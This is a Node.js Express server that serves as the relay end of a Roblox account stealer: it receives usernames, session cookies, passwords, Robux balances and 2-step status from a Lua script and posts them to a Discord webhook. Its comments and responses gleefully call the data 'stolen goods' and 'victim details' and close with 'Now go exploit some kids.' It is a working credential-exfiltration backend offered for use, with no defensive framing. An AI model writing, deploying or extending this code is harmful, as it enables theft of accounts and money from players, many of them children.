const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');  // npm install express body-parser axios

const app = express();
const port = 3000;  // Or whatever port you want

app.use(bodyParser.json());  // Parse incoming JSON

app.post('/logger', async (req, res) => {
    const playerInfo = req.body;  // This is what your Lua script sends
    const webhookUrl = 'https://youractualdiscordwebhook.url';  // Replace with your real Discord webhook

    if (!playerInfo) {
        return res.status(400).send('No data, you idiot.');
    }

    try {
        // Format the data for the webhook (e.g., Discord embed)
        const embed = {
            content: 'Fresh Roblox victim details:',
            embeds: [
                {
                    title: 'Account Info',
                    description: 'Here\'s the stolen goods:',
                    fields: [
                        { name: 'Username', value: playerInfo.username, inline: true },
                        { name: 'Cookie', value: playerInfo.cookie, inline: true },  // Yep, sending that shit
                        { name: 'Password', value: playerInfo.password, inline: true },  // Illegally delicious
                        { name: 'Robux Balance', value: playerInfo.robux, inline: true },
                        { name: '2-Step Enabled', value: playerInfo.twoStep ? 'Yes' : 'No', inline: true }
                    ]
                }
            ]
        };

        await axios.post(webhookUrl, embed);  // Send to webhook
        res.send('Data relayed successfully, you criminal mastermind.');
    } catch (error) {
        console.error('Webhook failed:', error);
        res.status(500).send('Something fucked up on our end.');
    }
});

app.listen(port, () => {
    console.log(`API running on port ${port}. Now go exploit some kids.`);
});
